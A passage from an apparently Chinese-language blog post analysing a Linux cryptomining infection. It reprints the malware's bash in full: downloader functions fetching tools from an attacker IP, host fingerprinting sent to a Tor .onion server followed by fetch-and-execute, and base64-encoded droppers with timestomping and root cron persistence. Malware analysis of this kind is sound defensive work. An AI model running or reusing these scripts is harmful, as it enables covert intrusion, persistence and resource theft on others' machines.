class=\"nv\">HOST</span><span class=\"k\">}</span><span class=\"s2\">\"</span> <span class=\"o\">==</span> x<span class=\"s2\">\"</span><span class=\"k\">${</span><span class=\"nv\">PORT</span><span class=\"k\">}</span><span class=\"s2\">\"</span> <span class=\"o\">]]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nv\">PORT</span><span class=\"o\">=</span>80\n\n  <span class=\"nb\">exec </span>3&lt;<span class=\"o\">&gt;</span>/dev/tcp/<span class=\"k\">${</span><span class=\"nv\">HOST</span><span class=\"k\">}</span>/<span class=\"nv\">$PORT</span>\n  <span class=\"nb\">echo</span> <span class=\"nt\">-en</span> <span class=\"s2\">\"GET </span><span class=\"k\">${</span><span class=\"nv\">DOC</span><span class=\"k\">}</span><span class=\"s2\"> HTTP/1.0</span><span class=\"se\">\\r\\n</span><span class=\"s2\">Host: </span><span class=\"k\">${</span><span class=\"nv\">HOST</span><span class=\"k\">}</span><span class=\"se\">\\r\\n\\r\\n</span><span class=\"s2\">\"</span> <span class=\"o\">&gt;</span>&amp;3\n  <span class=\"o\">(</span><span class=\"k\">while </span><span class=\"nb\">read </span>line<span class=\"p\">;</span> <span class=\"k\">do</span>\n   <span class=\"o\">[[</span> <span class=\"s2\">\"</span><span class=\"nv\">$line</span><span class=\"s2\">\"</span> <span class=\"o\">==</span> <span class=\"s1\">$'</span><span class=\"se\">\\r</span><span class=\"s1\">'</span> <span class=\"o\">]]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">break\n  </span><span class=\"k\">done</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cat</span><span class=\"o\">)</span> &lt;&amp;3\n  <span class=\"nb\">exec </span>3&gt;&amp;-\n<span class=\"o\">}</span>\n\n<span class=\"nb\">rm</span> <span class=\"nt\">-f</span> <span class=\"nv\">$HOME</span>/ss\ncurl <span class=\"nt\">-V</span> <span class=\"o\">||</span> wget <span class=\"nt\">-q</span> https://github.com/moparisthebest/static-curl/releases/download/v7.75.0/curl-amd64 <span class=\"nt\">-O</span> <span class=\"nv\">$HOME</span>/curl<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/curl\ncurl <span class=\"nt\">-V</span> <span class=\"o\">||</span> kurl http://139.59.150.7:443/curl <span class=\"o\">&gt;</span> <span class=\"nv\">$HOME</span>/curl<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/curl\nss <span class=\"nt\">-v</span>   <span class=\"o\">||</span> kurl http://139.59.150.7:443/ss   <span class=\"o\">&gt;</span> <span class=\"nv\">$HOME</span>/ss<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ss\nss <span class=\"nt\">-v</span>   <span class=\"o\">||</span> curl <span class=\"nt\">-s</span> http://139.59.150.7:443/ss <span class=\"nt\">-o</span> <span class=\"nv\">$HOME</span>/ss<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ss\nps      <span class=\"o\">||</span> curl <span class=\"nt\">-s</span> http://139.59.150.7:443/ps <span class=\"nt\">-o</span> <span class=\"nv\">$HOME</span>/ps<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ps\n\n<span class=\"nv\">d</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">grep </span>x:<span class=\"si\">$(</span><span class=\"nb\">id</span> <span class=\"nt\">-u</span><span class=\"si\">)</span>: /etc/passwd|cut <span class=\"nt\">-d</span>: <span class=\"nt\">-f6</span><span class=\"si\">)</span>\n<span class=\"nv\">c</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"curl -4fsSLkA- -m200\"</span><span class=\"si\">)</span>\n<span class=\"nv\">t</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"rxmxpzfkydkulhhqnuftbmf6d5q67jjchopmh4ofszfwwnmz4bqq2fid\"</span><span class=\"si\">)</span>\n\nsockz<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"nv\">n</span><span class=\"o\">=(</span>doh.nl.ahadns.net dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.no.ahadns.net doh-fi.blahdns.com <span class=\"k\">fi</span>.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch<span class=\"o\">)</span>\n<span class=\"nv\">p</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"dns-query?name=relay.tor2socks.in\"</span><span class=\"si\">)</span>\n<span class=\"nv\">s</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nv\">$c</span> https://<span class=\"k\">${</span><span class=\"nv\">n</span><span class=\"p\">[</span><span class=\"k\">$((</span>RANDOM%11<span class=\"k\">))</span><span class=\"p\">]</span><span class=\"k\">}</span>/<span class=\"nv\">$p</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-oE</span> <span class=\"s2\">\"</span><span class=\"se\">\\b</span><span class=\"s2\">([0-9]{1,3}</span><span class=\"se\">\\.</span><span class=\"s2\">){3}[0-9]{1,3}</span><span class=\"se\">\\b</span><span class=\"s2\">\"</span> |tr <span class=\"s1\">' '</span> <span class=\"s1\">'\\n'</span>|grep <span class=\"nt\">-Ev</span> <span class=\"o\">[</span>.]0|sort <span class=\"nt\">-uR</span>|head <span class=\"nt\">-n</span> 1<span class=\"si\">)</span>\n<span class=\"o\">}</span>\n\nfexe<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"nb\">.</span> <span class=\"nv\">$HOME</span> /usr/bin <span class=\"nv\">$d</span> /tmp /var/tmp <span class=\"p\">;</span><span class=\"k\">do </span><span class=\"nb\">echo exit</span> <span class=\"o\">&gt;</span> <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">chmod</span> +x <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cd</span> <span class=\"nv\">$i</span> <span class=\"o\">&amp;&amp;</span> ./i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">rm</span> <span class=\"nt\">-f</span> i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">break</span><span class=\"p\">;</span><span class=\"k\">done</span>\n<span class=\"o\">}</span>\n\nu<span class=\"o\">()</span> <span class=\"o\">{</span>\nsockz\n<span class=\"nv\">f</span><span class=\"o\">=</span>/l/sp.<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>\n<span class=\"nv\">x</span><span class=\"o\">=</span>./<span class=\"si\">$(</span><span class=\"nb\">date</span>|md5sum|cut <span class=\"nt\">-f1</span> <span class=\"nt\">-d-</span><span class=\"si\">)</span>\n<span class=\"nv\">r</span><span class=\"o\">=</span><span class=\"si\">$(</span>curl <span class=\"nt\">-4fsSLk</span> checkip.amazonaws.com||curl <span class=\"nt\">-4fsSLk</span> ip.sb<span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">whoami</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-n</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>ip a|grep <span class=\"s1\">'inet '</span>|awk <span class=\"o\">{</span><span class=\"s1\">'print $2'</span><span class=\"o\">}</span>|md5sum|awk <span class=\"o\">{</span><span class=\"s1\">'print $1'</span><span class=\"o\">}</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>crontab <span class=\"nt\">-l</span>|base64 <span class=\"nt\">-w0</span><span class=\"si\">)</span>\n<span class=\"nv\">$c</span> <span class=\"nt\">-x</span> socks5h://<span class=\"nv\">$s</span>:9050 <span class=\"nv\">$t</span>.onion<span class=\"nv\">$f</span> <span class=\"nt\">-o</span><span class=\"nv\">$x</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span> <span class=\"o\">||</span> <span class=\"nv\">$c</span> <span class=\"nv\">$1$f</span> <span class=\"nt\">-o</span><span class=\"nv\">$x</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span>\n<span class=\"nb\">chmod</span> +x <span class=\"nv\">$x</span><span class=\"p\">;</span><span class=\"nv\">$x</span><span class=\"p\">;</span><span class=\"nb\">rm</span> <span class=\"nt\">-f</span> <span class=\"nv\">$x</span>\n<span class=\"o\">}</span>\n\n<span class=\"k\">for </span>h <span class=\"k\">in </span>tor2web.in tor2web.it\n<span class=\"k\">do\nif</span> <span class=\"o\">!</span> <span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status<span class=\"p\">;</span> <span class=\"k\">then\n</span>fexe<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span>\n<span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"nb\">cd</span> /tmp<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span><span class=\"o\">)</span>\n<span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"nb\">cd</span> /dev/shm<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span><span class=\"o\">)</span>\n<span class=\"k\">else\n</span><span class=\"nb\">break\n</span><span class=\"k\">fi\ndone</span>\n\n</code></pre></div></div>\n\n<p>好家伙，过来过去，从 bash 到 elf 再到 jar，一直都是这个 bash 脚本。</p>\n\n<p>一切都是为了这个 bash 脚本服务。</p>\n\n<p>其中有一段下载文件的步骤，之前也看到了，但是没有仔细分析。在曾大佬的带领下，一行一行分析了这个bash的功能.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>\n<span class=\"k\">function </span>kurl<span class=\"o\">()</span> <span class=\"o\">{</span>\n  <span class=\"nb\">read </span>proto server path <span class=\"o\">&lt;&lt;&lt;</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"k\">${</span><span class=\"nv\">1</span><span class=\"p\">//// </span><span class=\"k\">}</span><span class=\"si\">)</span>\n  <span class=\"nv\">DOC</span><span class=\"o\">=</span>/<span class=\"k\">${</span><span class=\"nv\">path</span><span class=\"p\">// //</span><span class=\"k\">}</span>\n  <span class=\"nv\">HOST</span><span class=\"o\">=</span><span class=\"k\">${</span><span class=\"nv\">server</span><span class=\"p\">//</span>:<span class=\"p\">*</span><span class=\"k\">}</span>\n  <span class=\"nv\">PORT</span><span class=\"o\">=</span><span class=\"k\">${</span><span class=\"nv\">server</span><span class=\"p\">//*</span>:<span class=\"k\">}</span>\n  <span class=\"o\">[[</span> x<span class=\"s2\">\"</span><span class=\"k\">${</span><span class=\"nv\">HOST</span><span class=\"k\">}</span><span class=\"s2\">\"</span> <span class=\"o\">==</span> x<span class=\"s2\">\"</span><span class=\"k\">${</span><span class=\"nv\">PORT</span><span class=\"k\">}</span><span class=\"s2\">\"</span> <span class=\"o\">]]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nv\">PORT</span><span class=\"o\">=</span>80\n\n  <span class=\"nb\">exec </span>3&lt;<span class=\"o\">&gt;</span>/dev/tcp/<span class=\"k\">${</span><span class=\"nv\">HOST</span><span class=\"k\">}</span>/<span class=\"nv\">$PORT</span>\n  <span class=\"nb\">echo</span> <span class=\"nt\">-en</span> <span class=\"s2\">\"GET </span><span class=\"k\">${</span><span class=\"nv\">DOC</span><span class=\"k\">}</span><span class=\"s2\"> HTTP/1.0</span><span class=\"se\">\\r\\n</span><span class=\"s2\">Host: </span><span class=\"k\">${</span><span class=\"nv\">HOST</span><span class=\"k\">}</span><span class=\"se\">\\r\\n\\r\\n</span><span class=\"s2\">\"</span> <span class=\"o\">&gt;</span>&amp;3\n  <span class=\"o\">(</span><span class=\"k\">while </span><span class=\"nb\">read </span>line<span class=\"p\">;</span> <span class=\"k\">do</span>\n   <span class=\"o\">[[</span> <span class=\"s2\">\"</span><span class=\"nv\">$line</span><span class=\"s2\">\"</span> <span class=\"o\">==</span> <span class=\"s1\">$'</span><span class=\"se\">\\r</span><span class=\"s1\">'</span> <span class=\"o\">]]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">break\n  </span><span class=\"k\">done</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cat</span><span class=\"o\">)</span> &lt;&amp;3\n  <span class=\"nb\">exec </span>3&gt;&amp;-\n<span class=\"o\">}</span>\n\n<span class=\"nb\">rm</span> <span class=\"nt\">-f</span> <span class=\"nv\">$HOME</span>/ss\ncurl <span class=\"nt\">-V</span> <span class=\"o\">||</span> wget <span class=\"nt\">-q</span> https://github.com/moparisthebest/static-curl/releases/download/v7.75.0/curl-amd64 <span class=\"nt\">-O</span> <span class=\"nv\">$HOME</span>/curl<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/curl\ncurl <span class=\"nt\">-V</span> <span class=\"o\">||</span> kurl http://139.59.150.7:443/curl <span class=\"o\">&gt;</span> <span class=\"nv\">$HOME</span>/curl<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/curl\nss <span class=\"nt\">-v</span>   <span class=\"o\">||</span> kurl http://139.59.150.7:443/ss   <span class=\"o\">&gt;</span> <span class=\"nv\">$HOME</span>/ss<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ss\nss <span class=\"nt\">-v</span>   <span class=\"o\">||</span> curl <span class=\"nt\">-s</span> http://139.59.150.7:443/ss <span class=\"nt\">-o</span> <span class=\"nv\">$HOME</span>/ss<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ss\nps      <span class=\"o\">||</span> curl <span class=\"nt\">-s</span> http://139.59.150.7:443/ps <span class=\"nt\">-o</span> <span class=\"nv\">$HOME</span>/ps<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ps\n\n</code></pre></div></div>\n\n<p>这个 <code class=\"language-plaintext highlighter-rouge\">kurl</code>，试图在没有 curl，没有 wget 的情况下，依赖 bash 内置功能，下载 curl。看起来这个攻击者是想要在类似于 docker 内部这样的刀耕火种的原始环境里面实现挖矿的功能。</p>\n\n<p>我推测攻击者会一些计算机编程，但是功底肯定不会这么深厚，这段代码很可能不是攻击者自己写的。要是他有手写这个代码的水平，那肯定不会搞挖矿这个行当了。带着这个疑问，搜索了一圈，找到了代码的<a href=\"https://unix.stackexchange.com/a/421318\">出处</a></p>\n\n<p>分析过来分析过去，没看到其他有用的信息了，根据努力不一定能成功，放弃一定很轻松的指导方针，tracepath 这个文件的分析暂时到此为止。</p>\n\n<h2 id=\"eqnr3jnr\">EQnR3jNR</h2>\n\n<p>这个文件的主要作用是通过 crontab 添加持久化， 通过多种方式横向移动的功能。</p>\n\n<p>通过动态调试该文件，可以看到执行了如下的 bash 命令。</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>nU9WagjQ8BenWPXt0ovE12uD8jBItv6\n<span class=\"nb\">exec</span> &amp;&gt;/dev/null\n<span class=\"nb\">export </span><span class=\"nv\">PATH</span><span class=\"o\">=</span><span class=\"nv\">$PATH</span>:<span class=\"nv\">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\n\n<span class=\"nv\">d</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">grep </span>x:<span class=\"si\">$(</span><span class=\"nb\">id</span> <span class=\"nt\">-u</span><span class=\"si\">)</span>: /etc/passwd|cut <span class=\"nt\">-d</span>: <span class=\"nt\">-f6</span><span class=\"si\">)</span>\n\nx<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"k\">if</span> <span class=\"o\">!</span> <span class=\"nb\">ls</span> <span class=\"nv\">$d</span>/.systemd-private-<span class=\"k\">*</span>.sh<span class=\"p\">;</span> <span class=\"k\">then\n</span><span class=\"nb\">grep</span> <span class=\"s2\">\"nU9WagjQ8BenWPXt0ovE12uD8jBItv6\"</span> <span class=\"nv\">$d</span>/.systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh <span class=\"o\">||</span> <span class=\"nb\">echo</span> <span class=\"nt\">-e</span> <span class=\"s2\">\"#</span><span class=\"se\">\\x</span><span class=\"s2\">21/bin/bash</span><span class=\"se\">\\n</span><span class=\"s2\">exec &amp;&gt;/dev/null</span><span class=\"se\">\\n</span><span class=\"s2\">echo nU9WagjQ8BenWPXt0ovE12uD8jBItv6</span><span class=\"se\">\\n</span><span class=\"s2\">echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash\"</span> <span class=\"o\">&gt;</span> <span class=\"nv\">$d</span>/.systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh\n<span class=\"nb\">touch</span> <span class=\"nt\">-r</span> /bin/grep <span class=\"nv\">$d</span>/.systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh\n<span class=\"nb\">chmod</span> +x <span class=\"nv\">$d</span>/.systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh\n<span class=\"k\">fi\nif</span> <span class=\"o\">!</span> <span class=\"nb\">ls</span> /opt/systemd-private-<span class=\"k\">*</span>.sh<span class=\"p\">;</span> <span class=\"k\">then\n</span><span class=\"nb\">grep</span> <span class=\"s2\">\"nU9WagjQ8BenWPXt0ovE12uD8jBItv6\"</span> /opt/systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh <span class=\"o\">||</span> <span class=\"nb\">echo</span> <span class=\"nt\">-e</span> <span class=\"s2\">\"#</span><span class=\"se\">\\x</span><span class=\"s2\">21/bin/bash</span><span class=\"se\">\\n</span><span class=\"s2\">exec &amp;&gt;/dev/null</span><span class=\"se\">\\n</span><span class=\"s2\">echo nU9WagjQ8BenWPXt0ovE12uD8jBItv6</span><span class=\"se\">\\n</span><span class=\"s2\">echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash\"</span> <span class=\"o\">&gt;</span> /opt/systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh\n<span class=\"nb\">touch</span> <span class=\"nt\">-r</span> /bin/grep /opt/systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh\n<span class=\"nb\">chmod</span> +x /opt/systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh\n<span class=\"k\">fi\nif</span> <span class=\"o\">!</span> <span class=\"nb\">ls</span> /etc/cron.d/0systemd-private-<span class=\"k\">*</span><span class=\"p\">;</span> <span class=\"k\">then\n</span><span class=\"nb\">grep </span>nU9WagjQ8BenWPXt0ovE12uD8jBItv6 /etc/cron.d/0systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6 <span class=\"o\">||</span> <span class=\"nb\">echo</span> <span class=\"s2\">\"</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"k\">$((</span>RANDOM%59<span class=\"k\">))</span><span class=\"si\">)</span><span class=\"s2\"> * * * * root /opt/systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh &gt; /dev/null 2&gt;&amp;1 &amp;\"</span> <span class=\"o\">&gt;</span> /etc/cron.d/0systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6\n<span class=\"nb\">touch</span> <span class=\"nt\">-r</span> /bin/grep /etc/cron.d/0systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6\n<span class=\"k\">fi\nif</span> <span class=\"o\">!</span> crontab <span class=\"nt\">-l</span> | <span class=\"nb\">grep</span> ^[0-9] | <span class=\"nb\">grep </span>systemd-private<span class=\"p\">;</span> <span class=\"k\">then</span>\n<span class=\"o\">(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"k\">$((</span>RANDOM%59<span class=\"k\">))</span><span class=\"si\">)</span><span class=\"s2\"> * * * * </span><span class=\"nv\">$d</span><span class=\"s2\">/.systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh &gt; /dev/null 2&gt;&amp;1 &amp;\"</span><span class=\"p\">;</span>crontab <span class=\"nt\">-l</span>|grep <span class=\"nt\">-v</span> systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6.sh<span class=\"o\">)</span>|crontab -\n<span class=\"k\">fi</span>\n<span class=\"o\">}</span>\nx\n</code></pre></div></div>\n\n<p>解 base64 之后可以发现功能是检查 <code class=\"language-plaintext highlighter-rouge\">$HOME/.systemd-private-*.sh</code> 是否存在，如果不存在，那么把前面分析过的恶意脚本的内容加进去。运气比较好，刚开始在机器上手撕病毒的时候，这几个自启动恶意程序都删掉了。</p>\n\n<p>代码里面包含大量的 bash64编码的内容。逆向分析的主要工作是动态调试然后解 base64和解决 00 截断导致的错误然后继续解base64 :)</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>nU9WagjQ8BenWPXt0ovE12uD8jBItv6\n<span class=\"nb\">exec</span> &amp;&gt;/dev/null\n<span class=\"nb\">export </span><span class=\"nv\">PATH</span><span class=\"o\">=</span><span class=\"nv\">$PATH</span>:<span class=\"nv\">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nfind /etc/cron<span class=\"k\">*</span>|xargs chattr <span class=\"nt\">-i</span><span class=\"p\">;</span>find /var/spool/cron<span class=\"k\">*</span>|xargs chattr <span class=\"nt\">-i</span><span class=\"p\">;</span>chattr <span class=\"nt\">-i</span> /etc/hosts\ncrontab <span class=\"nt\">-l</span> <span class=\"p\">;</span><span class=\"nb\">grep</span> <span class=\"nt\">-iRE</span> <span class=\"s2\">\"Evie0EAJrdlD6N9|tEYYDFeOnouIdvpQ|vPUjpEzwu4WUekG|systemd-service|data/pg_|main/pg_|pg_logical|cache/auto|ctlib|70OXQG|Malware|Miner|VUses5|</span><span 